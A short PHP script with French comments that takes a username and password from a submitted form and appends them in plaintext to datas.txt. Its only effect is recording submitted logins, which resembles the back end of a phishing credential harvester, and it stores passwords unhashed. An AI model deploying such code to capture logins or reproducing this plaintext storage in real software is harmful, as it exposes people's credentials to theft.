<?php
// Récupération des données du formulaire
$identifiant = $_POST['identifiant'] ?? '';
$motdepasse = $_POST['motdepasse'] ?? '';

// Concaténation des données
$data = "Identifiant: $identifiant, Mot de passe: $motdepasse\n";

// Ouverture du fichier en mode append (ajout)
$file = fopen("datas.txt", "a");

// Vérification si le fichier est ouvert avec succès
if ($file) {
    // Écriture des données dans le fichier
    fwrite($file, $data);
    echo "Données écrites avec succès dans datas.txt";
    // Fermeture du fichier
    fclose($file);
} else {
    echo "Erreur: Impossible d'ouvrir le fichier datas.txt";
}
?>
